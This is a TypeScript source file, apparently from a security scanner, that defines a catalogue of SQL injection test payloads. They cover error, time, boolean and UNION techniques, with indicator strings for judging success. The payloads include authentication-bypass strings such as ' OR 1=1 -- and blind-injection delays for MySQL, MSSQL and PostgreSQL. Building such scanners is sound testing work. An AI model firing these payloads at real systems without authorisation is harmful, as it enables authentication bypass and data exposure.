import { Payload, PayloadSet, generatePayloadId } from "./payload-types";

const errorBasedPayloads: Payload[] = [
  {
    id: generatePayloadId("sqli", "error_based", 1),
    category: "sqli",
    technique: "error_based",
    riskLevel: "safe",
    value: "'",
    description: "Single quote injection to trigger SQL syntax error",
    expectedBehavior: "Database error message revealing SQL syntax",
    successIndicators: [
      "SQL syntax",
      "mysql_fetch",
      "ORA-",
      "PG::SyntaxError",
      "SQLite3::SQLException",
      "SQLSTATE",
      "unclosed quotation",
      "quoted string not properly terminated",
    ],
    failureIndicators: ["404", "not found"],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "error_based", 2),
    category: "sqli",
    technique: "error_based",
    riskLevel: "safe",
    value: "1'--",
    description: "Single quote with comment to test SQL injection",
    expectedBehavior: "Application behavior change or error",
    successIndicators: [
      "SQL syntax",
      "mysql",
      "ORA-",
      "PG::",
      "SQLSTATE",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "error_based", 3),
    category: "sqli",
    technique: "error_based",
    riskLevel: "safe",
    value: "1' OR '1'='1",
    description: "Classic OR-based injection",
    expectedBehavior: "Authentication bypass or data exposure",
    successIndicators: [
      "welcome",
      "logged in",
      "success",
      "admin",
      "dashboard",
    ],
    failureIndicators: ["invalid", "error", "denied"],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "error_based", 4),
    category: "sqli",
    technique: "error_based",
    riskLevel: "safe",
    value: "1\" OR \"1\"=\"1",
    description: "Double quote OR-based injection",
    expectedBehavior: "Authentication bypass or data exposure",
    successIndicators: [
      "welcome",
      "logged in",
      "success",
    ],
    failureIndicators: ["invalid", "error"],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "error_based", 5),
    category: "sqli",
    technique: "error_based",
    riskLevel: "safe",
    value: "1' AND '1'='2",
    description: "AND FALSE condition to detect boolean-based injection",
    expectedBehavior: "Different response when condition is false",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "error_based", 6),
    category: "sqli",
    technique: "error_based",
    riskLevel: "safe",
    value: "' OR 1=1 --",
    description: "Auth bypass with comment terminator — comments out password check and remaining WHERE clauses",
    expectedBehavior: "Authentication bypass returning first user (typically admin), status change 401→200",
    successIndicators: [
      "token",
      "jwt",
      "session",
      "authenticated",
      "success",
      "admin",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "error_based", 7),
    category: "sqli",
    technique: "error_based",
    riskLevel: "safe",
    value: "' OR '1'='1' --",
    description: "Auth bypass variant with string comparison and comment terminator",
    expectedBehavior: "Authentication bypass, status change",
    successIndicators: [
      "token",
      "session",
      "success",
    ],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
];

const timeBasedPayloads: Payload[] = [
  {
    id: generatePayloadId("sqli", "time_based", 1),
    category: "sqli",
    technique: "time_based",
    riskLevel: "safe",
    value: "1' AND SLEEP(5)--",
    description: "MySQL time-based blind injection with 5 second delay",
    expectedBehavior: "Response delayed by approximately 5 seconds",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
    dbTypes: ["mysql"],
  },
  {
    id: generatePayloadId("sqli", "time_based", 2),
    category: "sqli",
    technique: "time_based",
    riskLevel: "safe",
    value: "1'; WAITFOR DELAY '0:0:5'--",
    description: "MSSQL time-based blind injection with 5 second delay",
    expectedBehavior: "Response delayed by approximately 5 seconds",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
    dbTypes: ["mssql"],
  },
  {
    id: generatePayloadId("sqli", "time_based", 3),
    category: "sqli",
    technique: "time_based",
    riskLevel: "safe",
    value: "1' AND pg_sleep(5)--",
    description: "PostgreSQL time-based blind injection with 5 second delay",
    expectedBehavior: "Response delayed by approximately 5 seconds",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
    dbTypes: ["postgresql"],
  },
  {
    id: generatePayloadId("sqli", "time_based", 4),
    category: "sqli",
    technique: "time_based",
    riskLevel: "safe",
    value: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    description: "MySQL subquery time-based injection",
    expectedBehavior: "Response delayed by approximately 5 seconds",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
    dbTypes: ["mysql"],
  },
];

const booleanBasedPayloads: Payload[] = [
  {
    id: generatePayloadId("sqli", "boolean_based", 1),
    category: "sqli",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "1 AND 1=1",
    description: "Boolean true condition",
    expectedBehavior: "Normal response (true condition)",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "boolean_based", 2),
    category: "sqli",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "1 AND 1=2",
    description: "Boolean false condition",
    expectedBehavior: "Different response (false condition)",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "boolean_based", 3),
    category: "sqli",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "1' AND '1'='1",
    description: "Boolean true with single quotes",
    expectedBehavior: "Normal response (true condition)",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "boolean_based", 4),
    category: "sqli",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "1' AND '1'='2",
    description: "Boolean false with single quotes",
    expectedBehavior: "Different response (false condition)",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
];

const unionBasedPayloads: Payload[] = [
  {
    id: generatePayloadId("sqli", "union_based", 1),
    category: "sqli",
    technique: "union_based",
    riskLevel: "low",
    value: "' UNION SELECT NULL--",
    description: "UNION injection to detect column count",
    expectedBehavior: "Error or different response indicating column mismatch",
    successIndicators: ["different number", "column", "UNION"],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "union_based", 2),
    category: "sqli",
    technique: "union_based",
    riskLevel: "low",
    value: "' UNION SELECT NULL,NULL--",
    description: "UNION injection with 2 columns",
    expectedBehavior: "Success if table has 2 columns",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "union_based", 3),
    category: "sqli",
    technique: "union_based",
    riskLevel: "low",
    value: "' UNION SELECT NULL,NULL,NULL--",
    description: "UNION injection with 3 columns",
    expectedBehavior: "Success if table has 3 columns",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("sqli", "union_based", 4),
    category: "sqli",
    technique: "union_based",
    riskLevel: "low",
    value: "' ORDER BY 1--",
    description: "ORDER BY injection to detect column count",
    expectedBehavior: "Normal response if column exists",
    successIndicators: [],
    failureIndicators: ["unknown column", "ORDER BY"],
    applicableContexts: ["url_param", "body_param"],
    encoding: "none",
  },
];

export const sqliPayloadSet: PayloadSet = {
  category: "sqli",
  name: "SQL Injection Payloads",
  description: "Comprehensive SQL injection test payloads for error-based, time-based, boolean-based, and union-based detection",
  payloads: [
    ...errorBasedPayloads,
    ...timeBasedPayloads,
    ...booleanBasedPayloads,
    ...unionBasedPayloads,
  ],
};

export function getSqliPayloads(technique?: string): Payload[] {
  if (!technique) return sqliPayloadSet.payloads;
  return sqliPayloadSet.payloads.filter(p => p.technique === technique);
}

export function getSqliPayloadsByDb(dbType: "mysql" | "postgresql" | "mssql" | "oracle" | "sqlite"): Payload[] {
  return sqliPayloadSet.payloads.filter(p => !p.dbTypes || p.dbTypes.includes(dbType));
}
